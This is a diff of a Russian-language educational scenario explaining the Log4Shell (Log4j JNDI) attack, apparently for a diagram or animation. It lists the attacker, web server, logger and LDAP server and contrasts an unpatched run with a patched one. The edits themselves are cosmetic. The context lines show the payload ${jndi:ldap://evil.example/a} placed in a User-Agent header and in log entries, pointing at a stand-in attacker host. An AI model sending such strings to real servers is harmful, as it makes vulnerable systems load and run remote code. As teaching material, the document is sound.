@@ -28,10 +28,10 @@
 
 ## Участники
 
-- `ldap` **Сервер атакующего** — evil.example · `icon:server` · `term:ldap`
+- `ldap` **Сервер хакера** — evil.example · `icon:server` · `term:ldap`
 - `attacker` **Атакующий** — 203.0.113.66 · `term:attacker`
 - `server` **Веб-сервер** — 198.51.100.10 · `term:web-server`
-- `log` **Журнал** — библиотека Log4j · `term:logging`
+- `log` **Журнал** — Log4j · `term:logging`
 
 ## Зоны
 
@@ -70,7 +70,7 @@ User-Agent: ⟦${jndi:ldap://evil.example/a}⟧
 ### `write` Запись в журнал
 
 `server → log` · `attack` · `without-defence`
-Сообщение: запись: ${jndi:…} · Итог: библиотека разбирает строку
+Сообщение: запись: ${jndi:...} · Итог: библиотека разбирает строку
 
 ```text
 INFO search q=socks agent=⟦${jndi:ldap://evil.example/a}⟧
@@ -167,7 +167,7 @@ Java на сервере магазина берёт его, чтобы собр
 ### `patched` Обновлённая библиотека
 
 `server → log` · `attack` · `with-defence` · `stopped`
-Сообщение: запись: ${jndi:…} · Итог: записано как текст, атака не сработала
+Сообщение: запись: ${jndi:...} · Итог: записано как текст, атака не сработала
 
 ```text
 INFO search q=socks agent=⟦${jndi:ldap://evil.example/a}⟧
